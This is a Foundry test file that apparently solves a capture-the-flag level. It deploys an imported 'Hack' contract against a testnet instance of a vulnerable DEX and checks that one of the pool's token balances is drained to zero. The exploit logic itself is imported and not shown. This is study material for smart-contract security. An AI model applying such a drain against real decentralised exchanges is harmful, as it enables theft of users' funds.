//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Hack, IDex} from "../src/level22.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract level22Test is Test {
    IDex target;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        address instanceAddress = vm.envAddress("INSTANCE_AD");
        target = IDex(instanceAddress);
    }

    function testSolvesLeve22() public {
        address hacker = makeAddr("yourkey");

        address t1 = target.token1();
        address t2 = target.token2();
        IERC20 token1 = IERC20(t1);
        IERC20 token2 = IERC20(t2);

        uint256 dexBal1Before = target.balanceOf(t1, address(target));
        uint256 dexBal2Before = target.balanceOf(t2, address(target));
        console.log("Dex token1 balance before:", dexBal1Before);
        console.log("Dex token2 balance before:", dexBal2Before);

        vm.startPrank(hacker, hacker);

        uint256 hackerBal1 = token1.balanceOf(hacker);
        uint256 hackerBal2 = token2.balanceOf(hacker);
        console.log("hacker token1 balance before:", hackerBal1);
        console.log("hacker token2 balance before:", hackerBal2);

        Hack hackContract = new Hack(address(target));

        if (hackerBal1 > 0) {
            token1.transfer(address(hackContract), hackerBal1);
        }
        if (hackerBal2 > 0) {
            token2.transfer(address(hackContract), hackerBal2);
        }

        hackContract.hack();
        vm.stopPrank();

        uint256 dexBal1After = target.balanceOf(t1, address(target));
        uint256 dexBal2After = target.balanceOf(t2, address(target));
        console.log("Dex token1 balance after:", dexBal1After);
        console.log("Dex token2 balance after:", dexBal2After);

        assertTrue(dexBal1After == 0 || dexBal2After == 0);
    }
}
//INSTANCE_AD=0x443a60f8e6e941D6EC5D3380B9B45F3a2A724C93 forge test --mt testSolvesLeve22 -vvv
